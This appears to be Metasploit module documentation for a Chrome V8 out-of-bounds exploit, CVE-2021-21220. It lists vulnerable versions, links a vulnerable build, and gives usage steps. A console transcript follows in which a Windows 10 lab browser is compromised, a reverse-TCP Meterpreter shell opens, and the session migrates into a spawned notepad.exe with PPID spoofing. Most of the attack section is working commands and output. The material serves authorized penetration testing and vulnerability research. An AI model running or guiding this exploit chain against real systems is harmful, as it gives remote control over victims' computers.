## Vulnerable Application

This module exploits CVE-2021-21220 an out of bounds access issue in Google Chrome versions before
89.0.4389.128/90.0.4430.72 (64 bit) that was reported as part of Pwn2Own 2021 by Bruno Keith and
Niklas Baumstark of Dataflow Security.

The exploit takes advantage of a lack of proper input validation in the V8 engine on x86_x64 builds
of Chrome when handling XOR operations within JIT compiled code. Successful exploitation leads to RCE execution
within the context of the V8 renderer.

Note that as the V8 renderer is sandboxed within typical Chrome setups, the browser must be run without a sandbox by using
the --no-sandbox option for the payload to work correctly.

The module is compatible with any 64bit Google Chrome (versions before 87.0.4280.88) on multiple platforms.
However, the code that writes the shellcode into the rwx region (wasm_rwx_addr) may need to be modified.

**Vulnerable Application Installation Steps**

You can download a vulnerable Chrome version from this location:
[https://chromium.cypress.io/win64/beta/90.0.4430.70](https://chromium.cypress.io/win64/beta/90.0.4430.70)

## Verification Steps

1. Do: `use exploit/multi/browser/chrome_cve_2021_21220_v8_insufficient_validation`
2. Do: `set URIPATH / [PATH]`
3. Do: `set LHOST [IP]`
4. Do: `set SRVHOST [IP]`
5. Do: `exploit`

## Options
None

## Scenarios

### Windows 10 and Google Chrome 90.0.4430.0 with --no-sandbox

Start Google Chrome without a sandbox, e.g:
`"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --no-sandbox`

```
msf6 > use exploit/multi/browser/chrome_cve_2021_21220_v8_insufficient_validation
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/browser/chrome_cve_2021_21220_v8_insufficient_validation) > set TARGET 1
TARGET => 1
msf6 exploit(multi/browser/chrome_cve_2021_21220_v8_insufficient_validation) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/browser/chrome_cve_2021_21220_v8_insufficient_validation) > show options

Module options (exploit/multi/browser/chrome_cve_2021_21220_v8_insufficient_validation):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local mac
                                       hine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.17.233.206   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows 10 - Google Chrome < 89.0.4389.128/90.0.4430.72 (64 bit)


msf6 exploit(multi/browser/chrome_cve_2021_21220_v8_insufficient_validation) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/browser/chrome_cve_2021_21220_v8_insufficient_validation) >
[*] Started reverse TCP handler on 172.17.233.206:4444
[*] Using URL: http://0.0.0.0:8080/F6htJoKY5li
[*] Local IP: http://172.17.233.206:8080/F6htJoKY5li
[*] Server started.
[*] 172.17.236.178   chrome_cve_2021_21220_v8_insufficient_validation - Sending /F6htJoKY5li to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.0 Safari/537.36
[*] Sending stage (200262 bytes) to 172.17.236.178
[*] Meterpreter session 1 opened (172.17.233.206:4444 -> 172.17.236.178:65165) at 2021-04-27 13:19:35 -0500

msf6 exploit(multi/browser/chrome_cve_2021_21220_v8_insufficient_validation) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: DESKTOP-KUO5CML\test
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/browser/chrome_cve_2021_21220_v8_insufficient_validation) > use post/windows/manage/migrate
msf6 post(windows/manage/migrate) > show options

Module options (post/windows/manage/migrate):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   KILL       false            no        Kill original process for the session.
   NAME                        no        Name of process to migrate to.
   PID        0                no        PID of process to migrate to.
   PPID       0                no        Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)
                                         .
   PPID_NAME                   no        Name of process for PPID spoofing when creating a new process.
   SESSION                     yes       The session to run this module on.
   SPAWN      true             no        Spawn process to migrate to. If set, notepad.exe is used.

msf6 post(windows/manage/migrate) > set SESSION 1
SESSION => 1
msf6 post(windows/manage/migrate) > run

[*] Running module against DESKTOP-KUO5CML
[*] Current server process: chrome.exe (10116)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 8732
[+] Successfully migrated into process 8732
[*] Post module execution completed
msf6 post(windows/manage/migrate) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getpid
Current pid: 8732
meterpreter > getuid
Server username: DESKTOP-KUO5CML\test
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > sysinfo
Computer        : DESKTOP-KUO5CML
OS              : Windows 10 (10.0 Build 19041).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```
